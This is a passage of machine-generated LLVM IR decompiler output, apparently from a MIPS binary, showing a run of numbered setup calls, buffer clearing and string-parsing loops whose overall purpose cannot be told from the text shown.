  store i32 %v4_4011e8, i32* %v0.global-to-local, align 4
  store i32 8, i32* %a0.global-to-local, align 4
  %v3_4011fc = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4011fc, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408180.68 to i32), i32* %a2.global-to-local, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v4_401204 = call i32 @function_401050(i32 8, i32 8, i32 ptrtoint (i32* @global_var_408180.68 to i32))
  store i32 %v4_401204, i32* %v0.global-to-local, align 4
  store i32 9, i32* %a0.global-to-local, align 4
  %v3_401218 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401218, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_40818c.69 to i32), i32* %a2.global-to-local, align 4
  store i32 13, i32* %a1.global-to-local, align 4
  %v4_401220 = call i32 @function_401050(i32 9, i32 13, i32 ptrtoint (i32* @global_var_40818c.69 to i32))
  store i32 %v4_401220, i32* %v0.global-to-local, align 4
  store i32 10, i32* %a0.global-to-local, align 4
  %v3_401234 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401234, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_40819c.70 to i32), i32* %a2.global-to-local, align 4
  store i32 11, i32* %a1.global-to-local, align 4
  %v4_40123c = call i32 @function_401050(i32 10, i32 11, i32 ptrtoint (i32* @global_var_40819c.70 to i32))
  store i32 %v4_40123c, i32* %v0.global-to-local, align 4
  store i32 11, i32* %a0.global-to-local, align 4
  %v3_401250 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401250, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4081a8.71 to i32), i32* %a2.global-to-local, align 4
  store i32 15, i32* %a1.global-to-local, align 4
  %v4_401258 = call i32 @function_401050(i32 11, i32 15, i32 ptrtoint (i32* @global_var_4081a8.71 to i32))
  store i32 %v4_401258, i32* %v0.global-to-local, align 4
  store i32 12, i32* %a0.global-to-local, align 4
  %v3_40126c = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_40126c, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4081b8.72 to i32), i32* %a2.global-to-local, align 4
  store i32 10, i32* %a1.global-to-local, align 4
  %v4_401274 = call i32 @function_401050(i32 12, i32 10, i32 ptrtoint (i32* @global_var_4081b8.72 to i32))
  store i32 %v4_401274, i32* %v0.global-to-local, align 4
  store i32 13, i32* %a0.global-to-local, align 4
  %v3_401288 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401288, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4081c4.73 to i32), i32* %a2.global-to-local, align 4
  store i32 10, i32* %a1.global-to-local, align 4
  %v4_401290 = call i32 @function_401050(i32 13, i32 10, i32 ptrtoint (i32* @global_var_4081c4.73 to i32))
  store i32 %v4_401290, i32* %v0.global-to-local, align 4
  store i32 14, i32* %a0.global-to-local, align 4
  %v3_4012a4 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4012a4, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4081d0.74 to i32), i32* %a2.global-to-local, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_4012ac = call i32 @function_401050(i32 14, i32 23, i32 ptrtoint (i32* @global_var_4081d0.74 to i32))
  store i32 %v4_4012ac, i32* %v0.global-to-local, align 4
  store i32 15, i32* %a0.global-to-local, align 4
  %v3_4012c0 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4012c0, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4081e8.75 to i32), i32* %a2.global-to-local, align 4
  store i32 33, i32* %a1.global-to-local, align 4
  %v4_4012c8 = call i32 @function_401050(i32 15, i32 33, i32 ptrtoint (i32* @global_var_4081e8.75 to i32))
  store i32 %v4_4012c8, i32* %v0.global-to-local, align 4
  store i32 16, i32* %a0.global-to-local, align 4
  %v3_4012dc = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4012dc, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_40820c.76 to i32), i32* %a2.global-to-local, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_4012e4 = call i32 @function_401050(i32 16, i32 23, i32 ptrtoint (i32* @global_var_40820c.76 to i32))
  store i32 %v4_4012e4, i32* %v0.global-to-local, align 4
  store i32 17, i32* %a0.global-to-local, align 4
  %v3_4012f8 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4012f8, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408224.77 to i32), i32* %a2.global-to-local, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v4_401300 = call i32 @function_401050(i32 17, i32 8, i32 ptrtoint (i32* @global_var_408224.77 to i32))
  store i32 %v4_401300, i32* %v0.global-to-local, align 4
  store i32 18, i32* %a0.global-to-local, align 4
  %v3_401314 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401314, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408230.78 to i32), i32* %a2.global-to-local, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v4_40131c = call i32 @function_401050(i32 18, i32 8, i32 ptrtoint (i32* @global_var_408230.78 to i32))
  store i32 %v4_40131c, i32* %v0.global-to-local, align 4
  store i32 19, i32* %a0.global-to-local, align 4
  %v3_401330 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401330, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_40823c.79 to i32), i32* %a2.global-to-local, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_401338 = call i32 @function_401050(i32 19, i32 23, i32 ptrtoint (i32* @global_var_40823c.79 to i32))
  store i32 %v4_401338, i32* %v0.global-to-local, align 4
  store i32 20, i32* %a0.global-to-local, align 4
  %v3_40134c = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_40134c, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408254.80 to i32), i32* %a2.global-to-local, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_401354 = call i32 @function_401050(i32 20, i32 23, i32 ptrtoint (i32* @global_var_408254.80 to i32))
  store i32 %v4_401354, i32* %v0.global-to-local, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v3_401368 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401368, i32* @t9, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_40826c.81 to i32), i32* %a2.global-to-local, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  %v5_401370 = call i32 @function_401050(i32 21, i32 2, i32 ptrtoint ([3 x i8]* @global_var_40826c.81 to i32))
  store i32 %v5_401370, i32* %v0.global-to-local, align 4
  store i32 25, i32* %a0.global-to-local, align 4
  %v3_401384 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401384, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408270.82 to i32), i32* %a2.global-to-local, align 4
  store i32 15, i32* %a1.global-to-local, align 4
  %v4_40138c = call i32 @function_401050(i32 25, i32 15, i32 ptrtoint (i32* @global_var_408270.82 to i32))
  store i32 %v4_40138c, i32* %v0.global-to-local, align 4
  store i32 26, i32* %a0.global-to-local, align 4
  %v3_4013a0 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4013a0, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408280.83 to i32), i32* %a2.global-to-local, align 4
  store i32 12, i32* %a1.global-to-local, align 4
  %v4_4013a8 = call i32 @function_401050(i32 26, i32 12, i32 ptrtoint (i32* @global_var_408280.83 to i32))
  store i32 %v4_4013a8, i32* %v0.global-to-local, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v3_4013bc = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4013bc, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408290.84 to i32), i32* %a2.global-to-local, align 4
  store i32 12, i32* %a1.global-to-local, align 4
  %v4_4013c4 = call i32 @function_401050(i32 27, i32 12, i32 ptrtoint (i32* @global_var_408290.84 to i32))
  store i32 %v4_4013c4, i32* %v0.global-to-local, align 4
  store i32 %v0_401114, i32* @ra, align 4
  %v3_4013d8 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4013d8, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4082a0.85 to i32), i32* %a2.global-to-local, align 4
  store i32 28, i32* %a0.global-to-local, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v7_4013e8 = call i32 @function_401050(i32 28, i32 23, i32 ptrtoint (i32* @global_var_4082a0.85 to i32))
  store i32 %v7_4013e8, i32* %v0.global-to-local, align 4
  %v1_4013f8 = load i32, i32* @t9, align 4
  %v1_4013fc = add i32 %v1_4013f8, 294668
  %v2_4013fc = inttoptr i32 %v1_4013fc to i32*
  %v3_4013fc = load i32, i32* %v2_4013fc, align 4
  store i32 %v3_4013fc, i32* %v0.global-to-local, align 4
  store i32 2036692075, i32* %t9.global-to-local, align 4
  %v1_401404 = inttoptr i32 %v3_4013fc to i32*
  %v2_401404 = load i32, i32* %v1_401404, align 4
  store i32 %v2_401404, i32* %a0.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  call void @__pseudo_branch(i32 2036692075)
  %v0_401420 = load i32, i32* @ra, align 4
  %v0_401428 = load i32, i32* @s7, align 4
  %v0_401430 = load i32, i32* @s5, align 4
  %v0_401438 = load i32, i32* @s3, align 4
  %v0_401440 = load i32, i32* @s1, align 4
  %v0_401444 = load i32, i32* @s0, align 4
  %v3_40144c = load i32, i32* inttoptr (i32 2036986811 to i32*), align 4
  store i32 %v3_40144c, i32* %t9.global-to-local, align 4
  %v0_401450 = load i32, i32* %a0.global-to-local, align 4
  %v1_401450 = urem i32 %v0_401450, 65536
  store i32 %v1_401450, i32* %s1.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_401458 = ptrtoint i32* %stack_var_-8239 to i32
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40144c)
  %v2_401468 = ptrtoint i32* %stack_var_-4143 to i32
  store i32 %v2_401468, i32* %a0.global-to-local, align 4
  %v3_40146c = load i32, i32* inttoptr (i32 2036986811 to i32*), align 4
  store i32 %v3_40146c, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40146c)
  %v2_401480 = ptrtoint i32* %stack_var_-8752 to i32
  store i32 %v2_401480, i32* %a0.global-to-local, align 4
  %v3_401484 = load i32, i32* inttoptr (i32 2036986811 to i32*), align 4
  store i32 %v3_401484, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 513, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401484)
  %v2_401498 = ptrtoint i32* %stack_var_-8784 to i32
  store i32 %v2_401498, i32* %a0.global-to-local, align 4
  %v3_40149c = load i32, i32* inttoptr (i32 2036986811 to i32*), align 4
  store i32 %v3_40149c, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 16, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40149c)
  %v0_4014b0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4014b0 = urem i32 %v0_4014b0, 256
  store i32 %v1_4014b0, i32* %a0.global-to-local, align 4
  %v3_4014b4 = load i32, i32* inttoptr (i32 2036986747 to i32*), align 4
  store i32 %v3_4014b4, i32* %t9.global-to-local, align 4
  %v2_4014b8 = ptrtoint i8* %stack_var_-8768 to i32
  store i32 %v2_4014b8, i32* %s0.global-to-local, align 4
  %v1_4014bc = mul nuw nsw i32 %v1_4014b0, 256
  %v1_4014c0 = udiv i32 %v0_4014b0, 256
  store i32 %v1_4014c0, i32* %s1.global-to-local, align 4
  %v2_4014c4 = or i32 %v1_4014bc, %v1_4014c0
  store i32 %v2_4014c4, i32* %a0.global-to-local, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  store i32 %v2_4014b8, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4014b4)
  %v3_4014dc = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_4014dc, i32* %t9.global-to-local, align 4
  store i32 %v2_4014b8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4014dc)
  store i32 2, i32* %v1.global-to-local, align 4
  %v0_4014f4 = load i32, i32* %v0.global-to-local, align 4
  %v2_4014f4 = icmp eq i32 %v0_4014f4, 2
  store i32 48, i32* %v0.global-to-local, align 4
  br i1 %v2_4014f4, label %dec_label_pc_4014f8, label %dec_label_pc_40151c

dec_label_pc_4014f8:                              ; preds = %dec_label_pc_401104
  %v4_401508 = zext i8 %tmp39 to i32
  store i32 %v4_401508, i32* %v1.global-to-local, align 4
  store i8 48, i8* %stack_var_-8768, align 1
  br label %dec_label_pc_40151c

dec_label_pc_40151c:                              ; preds = %dec_label_pc_401104, %dec_label_pc_4014f8
  %v3_40151c = load i32, i32* inttoptr (i32 2036986759 to i32*), align 4
  store i32 %v3_40151c, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40151c)
  %v3_401534 = load i32, i32* inttoptr (i32 2036986759 to i32*), align 4
  store i32 %v3_401534, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401534)
  %v3_40154c = load i32, i32* inttoptr (i32 2036986759 to i32*), align 4
  store i32 %v3_40154c, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40154c)
  %v3_401564 = load i32, i32* inttoptr (i32 2036986759 to i32*), align 4
  store i32 %v3_401564, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401564)
  %v3_40157c = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_40157c, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40157c)
  %v0_401590 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401590, i32* %a0.global-to-local, align 4
  %v3_401594 = load i32, i32* inttoptr (i32 2036986647 to i32*), align 4
  store i32 %v3_401594, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401594)
  %v0_4015a4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4015a4, i32* %s2.global-to-local, align 4
  %v2_4015b0 = icmp eq i32 %v0_4015a4, -1
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v2_4015b0, label %dec_label_pc_40151c.dec_label_pc_4015c0_crit_edge, label %dec_label_pc_40175c

dec_label_pc_40151c.dec_label_pc_4015c0_crit_edge: ; preds = %dec_label_pc_40151c
  %v1_4015c4.pre.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4015c0

dec_label_pc_4015c0:                              ; preds = %dec_label_pc_40151c.dec_label_pc_4015c0_crit_edge, %dec_label_pc_40175c
  %v1_4015c4.pre = phi i32 [ %v1_4015c4.pre.pre, %dec_label_pc_40151c.dec_label_pc_4015c0_crit_edge ], [ 0, %dec_label_pc_40175c ]
  store i32 %v2_401480, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4015c4

dec_label_pc_4015c4:                              ; preds = %dec_label_pc_4015d4, %dec_label_pc_4015c0
  %v3_4015d8 = phi i32 [ %v4_4015d8, %dec_label_pc_4015d4 ], [ %v1_4015c4.pre, %dec_label_pc_4015c0 ]
  %v2_4015c4 = add i32 %v3_4015d8, %v2_401480
  store i32 %v2_4015c4, i32* %v0.global-to-local, align 4
  %v1_4015c8 = inttoptr i32 %v2_4015c4 to i8*
  %v2_4015c8 = load i8, i8* %v1_4015c8, align 1
  %v3_4015c8 = sext i8 %v2_4015c8 to i32
  store i32 %v3_4015c8, i32* %a0.global-to-local, align 4
  %v1_4015d0 = icmp eq i8 %v2_4015c8, 0
  store i32 58, i32* %v0.global-to-local, align 4
  br i1 %v1_4015d0, label %dec_label_pc_40175c, label %dec_label_pc_4015d4

dec_label_pc_4015d4:                              ; preds = %dec_label_pc_4015c4
  %v2_4015d8 = icmp eq i8 %v2_4015c8, 58
  %v4_4015d8 = add i32 %v3_4015d8, 1
  store i32 %v4_4015d8, i32* %v1.global-to-local, align 4
  br i1 %v2_4015d8, label %dec_label_pc_4015dc, label %dec_label_pc_4015c4

dec_label_pc_4015dc:                              ; preds = %dec_label_pc_4015d4
  store i32 %v3_4015d8, i32* %v1.global-to-local, align 4
  %v1_4015e4 = add i32 %v3_4015d8, 2
  store i32 %v1_4015e4, i32* %a0.global-to-local, align 4
  %v2_4015e8 = add i32 %v1_4015e4, %v2_401480
  store i32 %v2_4015e8, i32* %v0.global-to-local, align 4
  store i32 %v1_4015e4, i32* %s1.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4015f4

dec_label_pc_4015f4:                              ; preds = %dec_label_pc_401600, %dec_label_pc_4015dc
  %v3_401604 = phi i32 [ %v4_401604, %dec_label_pc_401600 ], [ %v1_4015e4, %dec_label_pc_4015dc ]
  %v0_4015f4 = phi i32 [ %v3_4015fc, %dec_label_pc_401600 ], [ %v2_4015e8, %dec_label_pc_4015dc ]
  %v1_4015f4 = inttoptr i32 %v0_4015f4 to i8*
  %v2_4015f4 = load i8, i8* %v1_4015f4, align 1
  %v3_4015f4 = sext i8 %v2_4015f4 to i32
  store i32 %v3_4015f4, i32* %v1.global-to-local, align 4
  %v1_4015fc = icmp eq i8 %v2_4015f4, 0
  %v3_4015fc = add i32 %v0_4015f4, 1
  store i32 %v3_4015fc, i32* %v0.global-to-local, align 4
  br i1 %v1_4015fc, label %dec_label_pc_401610, label %dec_label_pc_401600

dec_label_pc_401600:                              ; preds = %dec_label_pc_4015f4
  %v2_401604 = icmp eq i8 %v2_4015f4, 32
  %v4_401604 = add i32 %v3_401604, 1
  store i32 %v4_401604, i32* %s1.global-to-local, align 4
  br i1 %v2_401604, label %dec_label_pc_401608, label %dec_label_pc_4015f4

dec_label_pc_401608:                              ; preds = %dec_label_pc_401600
  store i32 %v3_401604, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_401610

dec_label_pc_401610:                              ; preds = %dec_label_pc_4015f4, %dec_label_pc_401608
  store i32 %v2_401480, i32* %s0.global-to-local, align 4
  %v3_401614 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401614, i32* %t9.global-to-local, align 4
  store i32 %v2_4015e8, i32* %s0.global-to-local, align 4
  %v0_40161c = load i32, i32* @sp, align 4
  %v2_40161c = add i32 %v0_40161c, %v3_401604
  store i32 %v2_40161c, i32* %v0.global-to-local, align 4
  store i32 %v2_4015e8, i32* %a0.global-to-local, align 4
  %v2_401624 = add i32 %v2_40161c, 56
  %v3_401624 = inttoptr i32 %v2_401624 to i8*
  store i8 0, i8* %v3_401624, align 1
  call void @__pseudo_call(i32 %v3_401614)
  %v0_401630 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_401630, i32* %a0.global-to-local, align 4
  %v3_401634 = load i32, i32* inttoptr (i32 2036987127 to i32*), align 4
  store i32 %v3_401634, i32* %t9.global-to-local, align 4
  %v0_401638 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401638, i32* %a1.global-to-local, align 4
  store i32 %v2_4014b8, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401634)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v0_40164c = load i32, i32* %v0.global-to-local, align 4
  %v2_40164c = icmp eq i32 %v0_40164c, -1
  %v3_40164c = load i32, i32* %s1.global-to-local, align 4
  %v4_40164c = add i32 %v3_40164c, 1
  store i32 %v4_40164c, i32* %a0.global-to-local, align 4
  br i1 %v2_40164c, label %dec_label_pc_40175c, label %dec_label_pc_401650

dec_label_pc_401650:                              ; preds = %dec_label_pc_401610
  store i32 0, i32* @a3, align 4
  br label %dec_label_pc_401660

dec_label_pc_401660:                              ; preds = %dec_label_pc_4016c8, %dec_label_pc_401650
  %v0_4016e019 = phi i32 [ %v0_4016e020, %dec_label_pc_4016c8 ], [ 0, %dec_label_pc_401650 ]
  %v0_4016b015 = phi i32 [ %v0_4016b016, %dec_label_pc_4016c8 ], [ 0, %dec_label_pc_401650 ]
  %v2_4016d8 = phi i32 [ %v3_4016d8, %dec_label_pc_4016c8 ], [ %v4_40164c, %dec_label_pc_401650 ]
  %v0_40166c = phi i32 [ %v3_4016d0, %dec_label_pc_4016c8 ], [ -1, %dec_label_pc_401650 ]
  %v2_401664 = icmp eq i32 %v0_40166c, 32
  store i32 9, i32* %v0.global-to-local, align 4
  br i1 %v2_401664, label %dec_label_pc_4016ac, label %dec_label_pc_401668

dec_label_pc_401668:                              ; preds = %dec_label_pc_401660
  %v2_40166c = icmp eq i32 %v0_40166c, 9
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_40166c, label %dec_label_pc_4016ac, label %dec_label_pc_401670

dec_label_pc_401670:                              ; preds = %dec_label_pc_401668
  %v0_401674 = load i32, i32* %a2.global-to-local, align 4
  %v2_401674 = icmp eq i32 %v0_401674, 1
  br i1 %v2_401674, label %dec_label_pc_401678, label %dec_label_pc_4016a4

dec_label_pc_401678:                              ; preds = %dec_label_pc_401670
  %v1_40167c = add i32 %v0_4016b015, 1
  store i32 %v1_40167c, i32* @a3, align 4
  %v2_401680 = icmp eq i32 %v0_4016b015, 0
  store i32 0, i32* %a2.global-to-local, align 4
  br i1 %v2_401680, label %dec_label_pc_401684, label %dec_label_pc_4016b0

dec_label_pc_401684:                              ; preds = %dec_label_pc_401678
  %v0_401688 = load i32, i32* @sp, align 4
  %v2_401688 = add i32 %v0_401688, %v2_4016d8
  store i32 %v2_401688, i32* %v0.global-to-local, align 4
  %v1_40168c = add i32 %v2_401688, 57
  %v2_40168c = inttoptr i32 %v1_40168c to i8*
  %v3_40168c = load i8, i8* %v2_40168c, align 1
  %v4_40168c = sext i8 %v3_40168c to i32
  store i32 %v4_40168c, i32* %v1.global-to-local, align 4
  %v2_401694 = icmp eq i8 %v3_40168c, 65
  store i32 %v2_401688, i32* %v0.global-to-local, align 4
  br i1 %v2_401694, label %dec_label_pc_401698, label %dec_label_pc_4016c8

dec_label_pc_401698:                              ; preds = %dec_label_pc_401684
  br label %dec_label_pc_4016a4

dec_label_pc_4016a4:                              ; preds = %dec_label_pc_401670, %dec_label_pc_401698
  %v0_4016e024 = phi i32 [ %v0_4016e019, %dec_label_pc_401670 ], [ 1, %dec_label_pc_401698 ]
  %v0_4016b013 = phi i32 [ %v0_4016b015, %dec_label_pc_401670 ], [ 1, %dec_label_pc_401698 ]
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4016ac

dec_label_pc_4016ac:                              ; preds = %dec_label_pc_401668, %dec_label_pc_401660, %dec_label_pc_4016a4
  %v0_4016e023 = phi i32 [ %v0_4016e019, %dec_label_pc_401668 ], [ %v0_4016e019, %dec_label_pc_401660 ], [ %v0_4016e024, %dec_label_pc_4016a4 ]
  %v0_4016b014 = phi i32 [ %v0_4016b015, %dec_label_pc_401668 ], [ %v0_4016b015, %dec_label_pc_401660 ], [ %v0_4016b013, %dec_label_pc_4016a4 ]
  store i32 1, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4016b0

dec_label_pc_4016b0:                              ; preds = %dec_label_pc_401678, %dec_label_pc_4016ac
  %v0_4016e022 = phi i32 [ %v0_4016e019, %dec_label_pc_401678 ], [ %v0_4016e023, %dec_label_pc_4016ac ]
  %v0_4016b0 = phi i32 [ %v1_40167c, %dec_label_pc_401678 ], [ %v0_4016b014, %dec_label_pc_4016ac ]
  %v1_4016b0 = icmp slt i32 %v0_4016b0, 7
  %v2_4016b0 = zext i1 %v1_4016b0 to i32
  store i32 %v2_4016b0, i32* %v0.global-to-local, align 4
  %v1_4016b4 = icmp eq i1 %v1_4016b0, false
  %v2_4016b4 = load i32, i32* %a1.global-to-local, align 4
  %v3_4016b4 = add i32 %v2_4016b4, 1
  store i32 %v3_4016b4, i32* %a1.global-to-local, align 4
  br i1 %v1_4016b4, label %dec_label_pc_4016e0, label %dec_label_pc_4016b8

dec_label_pc_4016b8:                              ; preds = %dec_label_pc_4016b0
  %v0_4016c4 = load i32, i32* @sp, align 4
  %v2_4016c4 = add i32 %v0_4016c4, %v2_4016d8
  store i32 %v2_4016c4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4016c8

dec_label_pc_4016c8:                              ; preds = %dec_label_pc_401684, %dec_label_pc_4016b8
  %v0_4016e020 = phi i32 [ %v0_4016e019, %dec_label_pc_401684 ], [ %v0_4016e022, %dec_label_pc_4016b8 ]
  %v0_4016c8 = phi i32 [ %v2_401688, %dec_label_pc_401684 ], [ %v2_4016c4, %dec_label_pc_4016b8 ]
  %v0_4016b016 = phi i32 [ 1, %dec_label_pc_401684 ], [ %v0_4016b0, %dec_label_pc_4016b8 ]
  %v1_4016c8 = add i32 %v0_4016c8, 57
  store i32 %v1_4016c8, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v1_4016d0 = inttoptr i32 %v1_4016c8 to i8*
  %v2_4016d0 = load i8, i8* %v1_4016d0, align 1
  %v3_4016d0 = sext i8 %v2_4016d0 to i32
  store i32 %v3_4016d0, i32* %v1.global-to-local, align 4
  %v1_4016d8 = icmp eq i8 %v2_4016d0, 0
  %v3_4016d8 = add i32 %v2_4016d8, 1
  store i32 %v3_4016d8, i32* %a0.global-to-local, align 4
  br i1 %v1_4016d8, label %dec_label_pc_4016e0, label %dec_label_pc_401660

dec_label_pc_4016e0:                              ; preds = %dec_label_pc_4016c8, %dec_label_pc_4016b0
  %v1_401718 = phi i32 [ %v3_4016d8, %dec_label_pc_4016c8 ], [ %v2_4016d8, %dec_label_pc_4016b0 ]
  %v0_4016e0 = phi i32 [ %v0_4016e020, %dec_label_pc_4016c8 ], [ %v0_4016e022, %dec_label_pc_4016b0 ]
  %v1_4016e0 = icmp eq i32 %v0_4016e0, 0
  store i32 %v1_401718, i32* %a2.global-to-local, align 4
  br i1 %v1_4016e0, label %dec_label_pc_40175c, label %dec_label_pc_4016e4

dec_label_pc_4016e4:                              ; preds = %dec_label_pc_4016e0
  %v2_4016ec = add i32 %v1_401718, %v2_401480
  store i32 %v2_4016ec, i32* %v0.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4016f4

dec_label_pc_4016f4:                              ; preds = %dec_label_pc_401700, %dec_label_pc_4016e4
  %v3_401704 = phi i32 [ %v4_401704, %dec_label_pc_401700 ], [ %v1_401718, %dec_label_pc_4016e4 ]
  %v0_4016f4 = phi i32 [ %v3_4016fc, %dec_label_pc_401700 ], [ %v2_4016ec, %dec_label_pc_4016e4 ]
  %v1_4016f4 = inttoptr i32 %v0_4016f4 to i8*
  %v2_4016f4 = load i8, i8* %v1_4016f4, align 1
  %v3_4016f4 = sext i8 %v2_4016f4 to i32
  store i32 %v3_4016f4, i32* %v1.global-to-local, align 4
  %v1_4016fc = icmp eq i8 %v2_4016f4, 0
  %v3_4016fc = add i32 %v0_4016f4, 1
  store i32 %v3_4016fc, i32* %v0.global-to-local, align 4
  br i1 %v1_4016fc, label %dec_label_pc_401710, label %dec_label_pc_401700

dec_label_pc_401700:                              ; preds = %dec_label_pc_4016f4
  %v2_401704 = icmp eq i8 %v2_4016f4, 32
  %v4_401704 = add i32 %v3_401704, 1
  store i32 %v4_401704, i32* %a2.global-to-local, align 4
  br i1 %v2_401704, label %dec_label_pc_401708, label %dec_label_pc_4016f4

dec_label_pc_401708:                              ; preds = %dec_label_pc_401700
  store i32 %v3_401704, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_401710

dec_label_pc_401710:                              ; preds = %dec_label_pc_4016f4, %dec_label_pc_401708
  store i32 %v2_401480, i32* %v0.global-to-local, align 4
  store i32 %v2_401498, i32* %s1.global-to-local, align 4
  store i32 %v2_4016ec, i32* %s0.global-to-local, align 4
  %v3_40171c = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_40171c, i32* %t9.global-to-local, align 4
  %v2_401720 = add i32 %v3_401704, %v2_401498
  store i32 %v2_401720, i32* %v0.global-to-local, align 4
  %v1_401724 = add i32 %v2_401720, 32
  %v2_401724 = inttoptr i32 %v1_401724 to i8*
  store i8 0, i8* %v2_401724, align 1
  %v1_401728 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_401728, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40171c)
  %v0_401730 = load i32, i32* %v0.global-to-local, align 4
  %v1_401730 = icmp slt i32 %v0_401730, 16
  %v2_401730 = zext i1 %v1_401730 to i32
  store i32 %v2_401730, i32* %v0.global-to-local, align 4
  %v1_401738 = icmp eq i1 %v1_401730, false
  store i32 %v2_401498, i32* %a0.global-to-local, align 4
  br i1 %v1_401738, label %dec_label_pc_40175c, label %dec_label_pc_40173c

dec_label_pc_40173c:                              ; preds = %dec_label_pc_401710
  %v3_401740 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401740, i32* %t9.global-to-local, align 4
  %v1_401748 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_401748, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401740)
  br label %dec_label_pc_40175c

